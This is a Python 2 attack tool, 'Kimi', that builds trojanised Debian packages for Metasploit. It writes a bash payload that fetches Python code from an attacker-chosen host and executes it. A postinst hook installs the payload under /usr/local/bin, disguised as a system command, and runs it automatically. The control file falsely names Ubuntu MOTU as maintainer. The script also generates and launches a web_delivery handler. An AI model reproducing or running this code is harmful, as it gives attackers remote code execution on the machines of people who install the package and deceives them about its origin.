#!/usr/bin/env python2

__version__ = "1.2"
# ____  __. .__             .__
#|    |/ _| |__|   _____    |__|
#|      <   |  |  /      \  |  |
#|    |  \  |  | |  Y Y   \ |  |
#|____|__ \ |__| |__|_|   / |__|
#        \/            \./Suspicious Shell Activity
#        Malicious Debain Package Creator
#        Coded by Chaitanya Haritash
#        Twitter :: @bofheaded

##
# Information :::

#Kimi is a script which generates Malicious debian package for metasploit
#which consists of bash file. the bash file is deployed into "/usr/local/bin/" directory.
#Bash file injects and acts like some system command which when executed by victim
#and attacker hits with session.

#Kimi basically depends upon web_delivery module and every thing is automated.
#all the attacker needs is to do following settings :

#NOTE :: This project was made to be integrated with Venom Shellcode Generator 1.0.13.
#       It can be used standalone also all user needs is to change uripath in msf variables

#msf exploit(web_delivery) > set srvhost 192.168.0.102
#srvhost => 192.168.0.102
#msf exploit(web_delivery) > set uripath SecPatch
#uripath => SecPatch
#msf exploit(web_delivery) > set uripath /SecPatch
#uripath => /SecPatch
#msf exploit(web_delivery) > set Lhost 192.168.0.102
#Lhost => 192.168.0.102
#msf exploit(web_delivery) > show options
#msf exploit(web_delivery) > exploit

#Thanks r00t 3xpl0it for all corrections and ideas :) <3

##

import os,time,shutil
import argparse

banner = r"""
 ____  __. .__             .__
|    |/ _| |__|   _____    |__|
|      <   |  |  /      \  |  |
|    |  \  |  | |  Y Y   \ |  |
|____|__ \ |__| |__|_|   / |__| Ver {0}
        \/            \./Suspicious Shell Activity
        Malicious Debain Package Creator
        Coded by Chaitanya Haritash
        Twitter :: @bofheaded
  """.format(__version__)

payload = """
#!/bin/bash
python -c "import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://lhost:8080/SecPatch');exec(r.read());"
"""

def mkpost(name):
	m = """
#!/bin/bash

chmod 2755 /usr/local/bin/"""+name.replace(".deb","")+""" && /usr/local/bin/"""+name.replace(".deb","")+""" &
"""
	return m

def make_deb(name,arch,name_ver,ver):
  gen = """
#!/bin/sh
chmod u+x """+name+"""
cat >> control << EOF

Package: """+name+"""
Version: """+ver+"""
Section: Games and Amusement
Priority: optional
Architecture: """+arch+"""
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: MDPC kimi (SSA-RedTeam development 2017)

EOF

mkdir -p """+name_ver+"""/usr/local/bin
cp """+name+""" """+name_ver+""" /usr/local/bin
mv /usr/local/bin/"""+name+""" /usr/local/bin/"""+name.replace(".deb","")+"""
sleep 2
mkdir -p """+name_ver+"""/DEBIAN
cp control """+name_ver+"""/DEBIAN/control
cp postinst """+name_ver+"""/DEBIAN/postinst
sleep 3
dpkg-deb --build """+name_ver+"""
  """
  os.system(gen)
  time.sleep(2)
  os.remove(name)
  os.remove("control")
  os.remove("postinst")
  shutil.rmtree(name_ver)
  print "All done!!"

def make_resource(lhost,uri):
	res = """
use exploit/multi/script/web_delivery
set SRVHOST """+lhost+"""
set LHOST """+lhost+"""
set URIPATH """+uri+"""
exploit
"""
	b = open("handler.rc" , "w").write(res)
	print "execute handler: sudo msfconsole -r handler.rc"
	time.sleep(2)
	os.system("chmod 777 handler.rc")
	os.system('xterm -e "sudo msfconsole -q -r handler.rc"')
def main():
	print banner
	parser = argparse.ArgumentParser()
	parser.add_argument('-n','--name', help="Name for your package" , required="true")
	parser.add_argument('-l','--lhost', help="LHOST, for Handler" , required="true")
	parser.add_argument('-p','--lport', help="LPORT for Handler" , required="true")
	parser.add_argument('-u','--uri', help="URI of handler" , required="true")
	parser.add_argument('-V','--vers', help="Version for package" , required="true")
	parser.add_argument('-a','--arch', help="Architecture (i386/amd64)" , required="true")
	go = parser.parse_args()
	if os.getuid() != 0:
		print "Script requies root privileges for certain operations, aborting"
	else:
		try:
			j = str(go.name)+"_"+str(go.vers)
			mkpay= payload.replace("lhost",go.lhost).replace("SecPatch",go.uri).replace("8080",go.lport)
			f = open(go.name,"w+").write(mkpay)
			mkpost_script = open("postinst","a").write(mkpost(go.name))
			os.system("chmod 0755 postinst")
			print "[+] Building the package : ",go.name
			time.sleep(2)
			make_deb(str(go.name),str(go.arch),str(j),str(go.vers))
			print "[+] msfconsole will start in few :)"
			make_resource(go.lhost,go.uri)
		except Exception as e:
			print "Something is not going good : ",e
if __name__ == '__main__':
	main()
